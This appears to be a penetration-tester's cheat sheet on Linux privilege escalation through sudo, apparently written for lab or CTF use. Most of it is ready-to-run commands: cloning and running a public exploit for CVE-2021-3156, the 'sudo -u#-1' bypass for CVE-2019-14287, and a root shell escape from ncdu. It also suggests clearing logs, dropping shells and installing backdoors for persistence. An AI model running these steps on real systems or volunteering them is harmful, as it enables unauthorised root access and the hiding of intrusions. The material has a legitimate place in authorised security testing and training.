### 1. Technique Name:

Sudo Exploitation
### 2. Summary:

`sudo` is a Linux utility that allows permitted users to execute commands as another user, typically root. If misconfigured or outdated, it can be abused for privilege escalation. Vulnerabilities such as CVE-2019-14287 and CVE-2021-3156 allow bypassing defined sudo policies or triggering memory corruption for root shells. Additionally, some binaries allowed through `sudo` can be chained or hijacked to spawn a root shell.
### 3. Conditions / Requirements:

- `sudo` binary present on the system    
- User has limited or specific `sudo` rights (as seen via `sudo -l`)
- One or more of:
    - Vulnerable version of `sudo`    
    - Misconfigured `sudoers` entries (e.g., `sudo -u#-1`)
    - Binaries allowed that enable command execution (e.g., `ncdu`, `less`, `find`)    
- (For CVEs) Correct matching libc/sudo version
### 4. Enumeration Steps:
#### A. Check Sudo Permissions:

```bash
sudo -l
```
#### B. Check Sudo Version:

```bash
sudo -V | head -n1
```
#### C. Inspect Sudoers File (if permitted):

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```
### 5. Exploitation Steps:
#### A. CVE-2021-3156 – Heap Buffer Overflow in Sudo (root shell)

Affected Versions:

- `sudo` 1.8.2 through 1.8.31p2    
- Includes Ubuntu 20.04 (1.8.31), Debian 10 (1.8.27), Fedora 33 (1.9.2)

Steps:

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_id>
```

Example:

```bash
./sudo-hax-me-a-sandwich 1  # For Ubuntu 20.04
id                          # Should return uid=0(root)
```
#### B. CVE-2019-14287 – Sudo UID -1 Bypass

Condition:  
`sudoers` entry like:

```bash
cry0l1t3 ALL=(ALL) /usr/bin/id
```

Exploit:

```bash
sudo -u#-1 id
# → Escalates to UID 0 (root) due to -1 being interpreted as unsigned 0
```
#### C. Sudo + `ncdu` Binary Abuse with UID -1 Trick

Scenario:

```bash
User may run: (ALL, !root) /bin/ncdu
```

Exploit:

```bash
sudo -u#-1 /bin/ncdu
```

- Once inside `ncdu`, press `b` to spawn a shell.    
- Then run:

```bash
cat /root/flag.txt
```

> Note: `ncdu` checks environment variables like `SHELL` or `NCDU_SHELL`. It will default to `/bin/sh` and drop into a root shell when run under UID 0.
### 6. Post-Exploitation Tips:

- Clean up any modified `.bashrc`, dropped shells, or evidence in logs if stealth is necessary    
- If you obtain full sudo (`sudo su`), create a persistent user or install a backdoor only if allowed
- Log all misconfigurations for reporting and remediation
### 7. Example / Notes:

- Sudo Permissions Enumeration:    

```bash
sudo -l
```

- Triggering CVE-2019-14287:

```bash
sudo -u#-1 /usr/bin/id
# uid=0(root) ...
```

- `ncdu` Binary PrivEsc via Sudo:

```bash
sudo -u#-1 /bin/ncdu
# Press b inside ncdu interface
```

- Spawn shell via environment variable (optional if allowed):

```bash
export NCDU_SHELL=/bin/bash
sudo -u#-1 /bin/ncdu
```

- CVE-2021-3156 Exploit Use:

```bash
sudo -V
cat /etc/lsb-release
./sudo-hax-me-a-sandwich 1
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #sudo_abuse #sudo